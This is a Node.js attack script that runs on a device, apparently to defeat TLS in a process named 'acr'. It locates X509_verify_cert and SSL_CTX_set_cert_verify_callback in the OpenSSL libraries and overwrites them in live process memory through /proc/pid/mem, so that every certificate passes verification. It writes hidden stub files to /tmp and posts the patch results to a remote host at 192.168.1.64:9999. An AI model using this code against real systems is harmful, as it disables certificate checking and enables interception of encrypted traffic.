"use strict";
// audit109.js - patch X509_verify_cert. Symbol values in this ELF are ABSOLUTE
// addresses (non-PIE), so use them directly. Also patch SSL_CTX_set_cert_verify_callback.
var fs = require("fs");
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 25000 }).slice(0, cap || 12000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}
function trim(s) { return (s || "").trim(); }

function findSymbol(libpath, symname) {
    try {
        var data = fs.readFileSync(libpath);
        var e_shoff = data.readUInt32LE(32);
        var e_shentsize = data.readUInt16LE(46);
        var e_shnum = data.readUInt16LE(48);
        var e_shstrndx = data.readUInt16LE(50);
        function shdr(i) {
            var off = e_shoff + i * e_shentsize;
            return {
                name: data.readUInt32LE(off), type: data.readUInt32LE(off + 4),
                addr: data.readUInt32LE(off + 12), offset: data.readUInt32LE(off + 16),
                size: data.readUInt32LE(off + 20), link: data.readUInt32LE(off + 24),
                entsize: data.readUInt32LE(off + 36)
            };
        }
        var shstrOff = shdr(e_shstrndx).offset;
        function shname(i) {
            var n = shdr(i).name;
            var end = data.indexOf(0, shstrOff + n);
            return data.toString("ascii", shstrOff + n, end);
        }
        var dynsym = null, dynstr = null;
        for (var i = 0; i < e_shnum; i++) {
            var name = shname(i);
            if (name === ".dynsym") dynsym = shdr(i);
            if (name === ".dynstr") dynstr = shdr(i);
        }
        if (!dynsym || !dynstr) return null;
        var strOff = dynstr.offset;
        var count = dynsym.size / dynsym.entsize;
        for (var j = 0; j < count; j++) {
            var soff = dynsym.offset + j * dynsym.entsize;
            var st_name = data.readUInt32LE(soff);
            var st_value = data.readUInt32LE(soff + 4);
            var end = data.indexOf(0, strOff + st_name);
            var name = data.toString("ascii", strOff + st_name, end);
            if (name === symname) return st_value;
        }
    } catch (e) {}
    return null;
}

var out = {};
out.started = new Date().toISOString();

out.pidof = sh("pidof acr", 200);
var pid = trim(out.pidof).match(/^(\d+)/);
pid = pid ? pid[1] : null;
out.pid = pid;

if (!pid) {
    out.status = "NO_ACR";
    post("/p109_diag", out);
    post("/p109_done", { started: out.started });
} else {
    // find symbols (values are ABSOLUTE addresses in this ELF)
    var x509Addr = findSymbol("/usr/lib/libcrypto.so.1.0.0", "X509_verify_cert");
    var sslCtxAddr = findSymbol("/usr/lib/libssl.so.1.0.0", "SSL_CTX_set_cert_verify_callback");
    out.x509_addr = x509Addr ? "0x" + x509Addr.toString(16) : "NOT_FOUND";
    out.sslctx_addr = sslCtxAddr ? "0x" + sslCtxAddr.toString(16) : "NOT_FOUND";

    // patch X509_verify_cert to return 1
    if (x509Addr) {
        sh("printf '\\x01\\x20\\x70\\x47' > /tmp/.p80stub", 100);
        var before = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + x509Addr + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr = trim(sh("dd if=/tmp/.p80stub of=/proc/" + pid + "/mem bs=1 seek=" + x509Addr + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + x509Addr + " count=4 2>/dev/null | od -An -tx1", 120));
        out.x509_patch = { before: before, write: wr, after: after, ok: after.indexOf("01 20 70 47") >= 0 };
    }

    // patch SSL_CTX_set_cert_verify_callback to return 0 (don't register)
    if (sslCtxAddr) {
        sh("printf '\\x00\\x20\\x70\\x47' > /tmp/.nopstub", 100);
        var before2 = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + sslCtxAddr + " count=4 2>/dev/null | od -An -tx1", 120));
        var wr2 = trim(sh("dd if=/tmp/.nopstub of=/proc/" + pid + "/mem bs=1 seek=" + sslCtxAddr + " count=4 conv=notrunc 2>&1 | tail -1", 120));
        var after2 = trim(sh("dd if=/proc/" + pid + "/mem bs=1 skip=" + sslCtxAddr + " count=4 2>/dev/null | od -An -tx1", 120));
        out.sslctx_patch = { before: before2, write: wr2, after: after2, ok: after2.indexOf("00 20 70 47") >= 0 };
    }

    // I-cache flush
    out.flush = sh("kill -STOP " + pid + " 2>&1; sleep 0.1; kill -CONT " + pid + " 2>&1; echo OK", 200);

    post("/p109_patch", out);
    post("/p109_done", { started: out.started });
}
